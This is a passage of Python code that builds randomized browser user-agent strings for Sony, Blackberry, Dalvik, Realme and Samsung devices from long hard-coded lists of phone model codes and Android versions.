'SOV37', 'SO-05K', 'SO-05K', 'H8266', 'SOV38', 'H8116', 'H8166', 'H8416', '801SO', 'SO-01L', 'H9436', 'H9493', 'Xperia XZ3 Dual (AOSP)', 'Xperia XZ4', '602SO', 'G8231', 'G8232', 'SOV35', 'SOV35', 'C6603', 'C6602', 'C6833', 'C6802', 'SonySOL24', 'C6903', 'C6902', 'SO-02F', 'C6943', 'D5503', 'Xperia Z1s', 'Xperia Z1s', 'xperia z1s', 'D6503', 'D6503', 'D6503', 'SO-03F', 'SGP561', 'SOT21', 'Xperia Z2 Tablet WiFi', 'D6563', 'xperia z2a', 'D6653', 'D6603', 'SO-01G', 'SOL26', 'D6643', 'D5803', 'SO-02G', 'D5833', 'D6633', 'D6633', 'E6533', 'E6553', 'E6533', 'Xperia Z3C', 'Xperia z3Dual', 'Xperia z3tc', 'D6708', 'SOV31', 'SGP771', 'SO-03G', '402SO', 'Xperia Z4 Tablet', 'Xperia Z4 Tablet Wifi', 'Xperia Z4 Xtreme', 'xperia z4v', 'moto e22', '501SO', 'E6653', 'SO-01H', 'E6603', 'SO-02H', 'E5823', 'E5803', 'E5823', 'E6633', 'E6683', 'E6853', 'SO-03H', 'E6883', 'E6833', 'Xperia Z5P', 'Xperia Z7', 'C6502', 'C6506', 'C6503', 'SonyC6506', 'C6503', 'SOL25', 'Xperia ZQ', 'C5503', 'C5502'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Blackberry':
                    self.blackbery_model = random.choice(['BB10; Touch', 'BlackBerry; U; BlackBerry 9320; cs', 'BlackBerry; U; BlackBerry 9900; en-GB', 'BlackBerry; U; BlackBerry 9900; es', 'BlackBerry; U; BlackBerry 9900; en', 'BlackBerry; U; BlackBerry 9300; es', 'BlackBerry; U; BlackBerry 9800; nl'])
                    self.version = (f'{random.randrange(6,10)}.{random.randrange(0,3)}.{random.randrange(0,3)}.{random.randrange(480,3216)}')
                    self.useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.35+ (KHTML, like Gecko) Version/{} Mobile Safari/537.35+'.format(self.blackbery_model, self.version))
                elif self.jenis == 'Dalvik':
                    self.android_version = random.choice(['9', '13', '11', '12', '10'])
                    self.android_model = random.choice(['ADT-2 Build/PTT5.181126.002', 'A004SH Build/S1164', 'A002SO Build/58.1.D.6.129', 'Pixel 4a Build/TQ1A.230205.002', 'A101FC Build/V48RS66B', '901SH Build/RKQ1.210205.002', '908SH Build/S2008', 'A101SH Build/S1012', 'A004SH Build/S1015', 'A101FC Build/V69RS35D', '706SH Build/S2005', 'Pixel 4a Build/TQ2A.230305.008.C1', 'A001XM Build/SP1A.210812.016', '901SO Build/55.1.B.0.622', 'Pixel 6 Build/TQ1A.230205.002'])
                    self.useragent = ('Dalvik/2.1.0 (Linux; U; Android {}; {})'.format(self.android_version ,self.android_model))
                elif self.jenis == 'Realme':
                    self.android_version = random.choice(['12', '11', '13'])
                    self.android_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Samsung':
                    self.android_version = random.choice(['13', '12', '11', '10'])
                    self.android_model = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT',\
                                                         'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S', 'SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 